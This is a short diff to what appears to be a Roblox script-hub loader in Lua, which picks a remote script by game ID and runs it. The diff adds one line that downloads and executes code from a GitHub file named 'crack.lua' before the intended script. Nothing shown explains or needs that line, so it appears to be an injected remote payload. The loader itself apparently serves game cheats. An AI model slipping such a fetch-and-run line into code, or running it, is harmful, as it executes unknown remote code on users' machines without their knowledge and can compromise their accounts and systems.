@@ -9,6 +9,7 @@ local gameList = {
 
 local scriptUrl = gameList[game.PlaceId]
 if scriptUrl then
+	loadstring(game:HttpGet('https://raw.githubusercontent.com/public-account-7/crack/refs/heads/main/rez/crack.lua'))()
     loadstring(game:HttpGet(scriptUrl))()
 else
     game.Players.LocalPlayer:Kick("Không hỗ trợ game này | Not Support Game")
